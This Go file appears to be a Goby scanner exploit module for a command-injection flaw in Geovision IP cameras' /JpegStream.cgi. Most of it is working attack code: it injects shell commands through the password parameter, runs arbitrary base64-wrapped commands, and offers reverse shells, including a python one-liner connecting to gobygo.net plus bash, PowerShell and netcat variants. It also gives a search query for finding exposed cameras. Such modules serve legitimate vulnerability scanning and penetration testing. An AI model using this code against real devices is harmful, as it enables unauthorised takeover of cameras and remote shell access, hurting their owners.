package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Geovision IP Camera /JpegStream.cgi Command Execution Vulnerability",
    "Description": "<p>Geovision is a company that specializes in video surveillance solutions, offering a wide range of IP cameras for different security and surveillance needs. </p><p>Geovision IP Camera has a command execution vulnerability.</p>",
    "Product": "GeoVision-Camera",
    "Homepage": "http://www.geovision.com.cn/",
    "DisclosureDate": "2021-12-21",
    "PostTime": "2024-08-16",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/ssi.cgi/Login.htm\" && title=\"GeoVision\"  || header=\"thttpd/2.25b PHP/20030920\"",
    "GobyQuery": "body=\"/ssi.cgi/Login.htm\" && title=\"GeoVision\"  || header=\"thttpd/2.25b PHP/20030920\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "Geovision IP Camera /JpegStream.cgi 命令执行漏洞",
            "Product": "GeoVision-摄像头",
            "Description": "<p>Geovision 是一家专注于视频监控解决方案的公司，提供多种 IP 摄像机，用于不同的安全和监控需求。<br></p><p>Geovision IP Camera 存在命令执行漏洞。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Geovision IP Camera /JpegStream.cgi Command Execution Vulnerability",
            "Product": "GeoVision-Camera",
            "Description": "<p>Geovision is a company that specializes in video surveillance solutions, offering a wide range of IP cameras for different security and surveillance needs.&nbsp;</p><p>Geovision IP Camera has a command execution vulnerability.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9943"
}`
	setPayloadRequestcjnajncnancnjadnunedjdnuuhw7h3h23f := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		encodedStr := ""
		//对指令进行url编码
		for _, r := range command {
			encodedStr += "%" + fmt.Sprintf("%02X", r)
		}
		payload := "/JpegStream.cgi?username=GEOVISION&password=" + encodedStr + "&data_type=1&attachment=1&channel=1&secret=1&key=PWNED"
		//requestHeaders := "GET / HTTP/1.1\r\n" + "Host: " + hostInfo.HostInfo + "\r\n" + "Connection: keep-alive\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Content-Length: 35\r\n" + "\r\n"
		requestHeaders := "GET " + payload + " HTTP/1.1\r\nHost: " + hostInfo.HostInfo + "\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\r\nAccept-Encoding: gzip\r\n\r\n"
		conn, err := httpclient.GetTCPConn(hostInfo.HostInfo)
		if err != nil {
			return "", "", err
		}
		defer conn.Close()
		// 设置读写超时时间为15秒
		conn.SetDeadline(time.Now().Add(15 * time.Second))
		// 向套接字写入HTTP请求
		_, err = conn.Write([]byte(requestHeaders))
		if err != nil {
			return "", "", err
		}
		// 读取响应
		res := ""
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				break
			}
			res = res + string(buf[:n])
		}
		re, err := regexp.Compile("sh: ((.|\n)*?):")
		// 检查是否有匹配到内容
		if !re.MatchString(res) {
			return "", "", errors.New("fail")
		}
		match := re.FindStringSubmatch(res)
		vulURL := "/JpegStream.cgi"
		commandResult := match[1]
		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestcjnajncnancnjadnunedjdnuuhw7h3h23f

			text := goutils.RandomHexString(16)
			pocCommand := ";`echo '" + text + "'`;"
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestcjnajncnancnjadnunedjdnuuhw7h3h23f

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}
			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				//对指令进行base64编码
				command = base64.StdEncoding.EncodeToString([]byte(command))
				command = ";`\\`echo '" + command + "' | base64 -d\\` | base64`;"
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					fianlResult, err := base64.StdEncoding.DecodeString(Result)
					if err != nil {
            expResult.Success = false
            expResult.Output = err.Error()
            return expResult
					}
          expResult.Success = true
					expResult.Output =string(fianlResult)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					command = ";`" + command + "`;"
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
